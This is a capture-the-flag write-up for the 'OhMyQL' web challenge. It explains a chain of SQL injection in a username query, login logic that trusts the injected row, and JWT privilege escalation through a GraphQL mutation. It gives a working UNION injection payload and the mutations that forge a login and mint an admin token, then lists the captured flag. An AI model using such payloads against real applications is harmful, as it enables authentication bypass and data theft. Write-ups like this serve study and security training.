# OhMyQL

- **Lab / Category:** Web
- **Points:** 290
- **Difficulty:** hard
- **Challenge ID:** `5ab46a10-3c84-4d4f-a7a3-85c54ba2ec9b`
- **Status:** ✅ SOLVED

## Vulnerabilities (chain)
Express + `express-graphql` + sqlite3.

1. **SQL injection** in `database.js`:
   ```js
   const query = `SELECT * FROM users WHERE username = '${username}'`;
   ```
2. **Auth logic trusts the injected row.** `login` fetches the user by that query and only
   checks `row.password !== password`, then signs a JWT for the supplied `username`.
3. **`/admin` returns `process.env.FLAG`** for any JWT whose payload has `flagOwner === true`,
   and the `setFlagOwner` mutation mints exactly such a token as long as
   `context.user.username === username` (both come from attacker input).

## Exploit
Forge a user row with UNION so login succeeds, then upgrade the token to `flagOwner`:

```
P = zzz' UNION SELECT 'zzz','y',1-- -
```

```graphql
# 1) login — SQLi makes getUser() return {username:'zzz', password:'y', flagowner:1}
mutation { login(username:"zzz' UNION SELECT 'zzz','y',1-- -", password:"y"){ token } }
# 2) with that Bearer token, mint a flagOwner token (username must equal token's username)
mutation { setFlagOwner(username:"zzz' UNION SELECT 'zzz','y',1-- -") }
# 3) GET /admin  with  Authorization: Bearer <flagOwner token>   -> process.env.FLAG
```

The JWT `username` claim is just the raw payload string; `/admin` only checks `flagOwner`,
so the odd username is irrelevant.

## Flag
`FlagY{1b930af63fa7a7f4ee04e58cb7584bde}`

_Submission: ACCEPTED (Success — genuine first solve on this account)._
